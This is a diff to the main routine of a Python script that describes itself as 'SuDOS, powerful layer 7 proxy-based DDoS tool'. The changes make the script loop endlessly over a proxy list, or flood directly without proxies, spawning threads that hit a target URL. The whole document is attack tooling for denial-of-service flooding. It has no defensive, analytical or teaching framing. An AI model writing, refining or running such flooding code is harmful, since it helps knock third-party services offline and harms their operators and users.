@@ -149,9 +149,9 @@ def main():
         parser = argparse.ArgumentParser(description="SuDOS, powerful layer 7 proxy-based DDoS tool.")
         parser.add_argument("-t", "--threads", type=int, default=100, metavar="INT", help="Max thread count")
         parser.add_argument("-z", "--proxy-type", choices=["http", "socks4", "socks5"], metavar="PROXYTYPE", help="Proxy list type")
-        parser.add_argument("-x", "--proxy-list", metavar="FILE", help="Proxy list file")
-        parser.add_argument("-c", "--timeout", type=int, default=5, metavar="INT", help="Socket connection timeout")
-        parser.add_argument("-v", "--delay", type=int, metavar="INT", help="Timeout per HTTP request")
+        parser.add_argument("-x", "--proxy-list", metavar="PROXYFILE", help="Proxy list file")
+        parser.add_argument("-c", "--timeout", type=int, default=5, metavar="TIMEOUT", help="Socket connection timeout")
+        parser.add_argument("-v", "--delay", type=int, metavar="DELAY", help="Timeout per HTTP request")
         parser.add_argument("-b", "--connection-limit", type=int, metavar="INT", help="Connected socket count before flooding the target server")
         parser.add_argument("url", nargs="?", metavar="URL", help="Target URL including protocol, domain and port for particular use")
         args = parser.parse_args()
@@ -195,28 +195,34 @@ def main():
                 sys.exit()
             proxy_type = proxy_type.upper()
             proxy_type = getattr(socks, proxy_type)
+        atexit.register(onexit)
         threading.Thread(target=verbose, daemon=True).start()
         if proxy_list:
-            for proxy in proxies:
-                proxy = proxy.strip()
-                try:
-                    proxy_host, proxy_port = proxy.split(":")
-                except Exception:
-                    continue
-                try:
-                    proxy_port = int(proxy_port)
-                except Exception:
-                    continue
-                while True:
-                    if active_threads >= max_threads:
+            while True:
+                for proxy in proxies:
+                    proxy = proxy.strip()
+                    try:
+                        proxy_host, proxy_port = proxy.split(":")
+                    except Exception:
                         continue
-                    threading.Thread(target=sudos, args=[url], kwargs={"proxy_type": proxy_type, "proxy_host": proxy_host, "proxy_port": proxy_port}, daemon=True).start()
-                    break
+                    try:
+                        proxy_port = int(proxy_port)
+                    except Exception:
+                        continue
+                    while True:
+                        if active_threads >= max_threads:
+                            continue
+                        threading.Thread(target=sudos, args=[url], kwargs={"proxy_type": proxy_type, "proxy_host": proxy_host, "proxy_port": proxy_port}, daemon=True).start()
+                        break
+        else:
+            while True:
+                if active_threads >= max_threads:
+                    continue
+                threading.Thread(target=sudos, args=[url], daemon=True).start()
     except KeyboardInterrupt:
         sys.exit()
     except Exception:
         pass
 
 if __name__ == "__main__":
-    atexit.register(onexit)
     main()
